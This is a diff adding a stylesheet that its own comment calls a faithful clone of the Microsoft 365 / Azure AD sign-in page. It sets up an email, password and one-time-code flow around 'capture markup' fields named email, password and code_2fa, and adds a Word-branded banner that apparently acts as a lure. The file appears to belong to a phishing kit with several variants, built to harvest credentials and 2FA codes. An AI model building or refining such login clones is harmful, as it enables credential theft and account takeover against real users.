@@ -1,0 +1,90 @@
+/* Microsoft 365 / Azure AD sign-in — faithful clone of the real
+   login.microsoftonline.com Fluent page (captured). Multi-step
+   email -> password -> OTP. Capture markup (#step-email/#step-password/
+   #step-2fa, names email/password/code_2fa) shared with the other variants. */
+* { box-sizing: border-box; }
+html, body {
+  margin: 0; padding: 0; min-height: 100vh;
+  font-family: 'Segoe UI', 'Segoe UI Web', system-ui, -apple-system, 'Helvetica Neue', Arial, sans-serif;
+  color: #1b1b1b;
+}
+/* Real MS fluid background illustration, full-bleed */
+.bg { position: fixed; inset: 0; z-index: 0;
+  background: #eef1f6; overflow: hidden; }
+.bg svg { width: 100%; height: 100%; display: block; }
+
+.lightbox {
+  position: relative; z-index: 1;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+.card {
+  background: #fff;
+  width: 100%;
+  max-width: 440px;
+  padding: 44px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.20), 0 0 2px rgba(0,0,0,.12);
+  animation: fade .15s ease-out;
+}
+@keyframes fade { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: none; } }
+.ms-logo { height: 24px; width: auto; display: block; margin-bottom: 12px; }
+.title { font-size: 24px; font-weight: 600; line-height: 1.25; margin: 4px 0 12px; color: #1b1b1b; }
+.sub { font-size: 15px; color: #1b1b1b; margin: 0 0 14px; }
+.field {
+  width: 100%; padding: 6px 0 8px; border: none; border-bottom: 1px solid #666;
+  border-radius: 0; font-size: 15px; background: transparent; color: #1b1b1b; outline: none;
+}
+.field::placeholder { color: #666; }
+.field:focus { border-bottom: 2px solid #0067b8; padding-bottom: 7px; }
+.code { letter-spacing: .35em; font-family: 'Consolas','Menlo',monospace; }
+.meta { margin-top: 12px; font-size: 13px; color: #1b1b1b; }
+.meta a { color: #0067b8; text-decoration: none; }
+.meta a:hover { text-decoration: underline; }
+.actions { margin-top: 24px; display: flex; justify-content: flex-end; }
+.btn {
+  background: #0067b8; color: #fff; border: 0; border-radius: 0;
+  min-width: 108px; height: 32px; padding: 4px 12px; font-size: 15px; font-family: inherit; cursor: pointer;
+}
+.btn:hover { background: #005da6; }
+.chip { display: inline-flex; align-items: center; gap: 8px; margin-bottom: 10px; font-size: 15px; color: #1b1b1b; }
+.chip .back { color: #1b1b1b; font-size: 18px; }
+
+/* "Anmeldeoptionen" bar below the card (real MS element) */
+.signin-options {
+  background: #fff;
+  width: 100%; max-width: 440px;
+  margin-top: 14px; padding: 16px 44px;
+  display: flex; align-items: center; gap: 12px;
+  box-shadow: 0 2px 6px rgba(0,0,0,.20), 0 0 2px rgba(0,0,0,.12);
+  font-size: 15px; color: #1b1b1b; cursor: pointer;
+}
+
+.footer {
+  position: fixed; right: 0; bottom: 0; left: 0; z-index: 2;
+  display: flex; justify-content: flex-end; gap: 16px;
+  padding: 9px 18px; font-size: 12px; background: transparent;
+}
+.footer a { color: #2f2f2f; text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+.footer .dots { font-weight: 700; letter-spacing: 1px; }
+
+/* Mobile: real MS login goes edge-to-edge, white, no card shadow */
+@media (max-width: 600px) {
+  .lightbox { padding: 0; justify-content: flex-start; }
+  .card { max-width: none; box-shadow: none; padding: 28px 22px; min-height: auto; margin-top: 0; }
+  .signin-options { max-width: none; box-shadow: none; border-top: 1px solid #e5e5e5; }
+  .field { font-size: 16px; } /* avoid iOS zoom */
+  .btn { height: 40px; }
+  .footer { position: static; justify-content: center; }
+}
+
+.word-bar{position:relative;z-index:1;background:#185abd;color:#fff;padding:12px 18px}
+.word-inner{display:flex;align-items:center;gap:10px;max-width:1100px;margin:0 auto}
+.word-mark{display:inline-block;width:26px;height:26px;line-height:26px;text-align:center;background:#fff;color:#185abd;font-weight:800;border-radius:3px}
+.word-txt{font-size:15px}
+.word-sub{max-width:1100px;margin:6px auto 0;font-size:12.5px;opacity:.92}
+@media(max-width:600px){.word-txt{font-size:13px}}
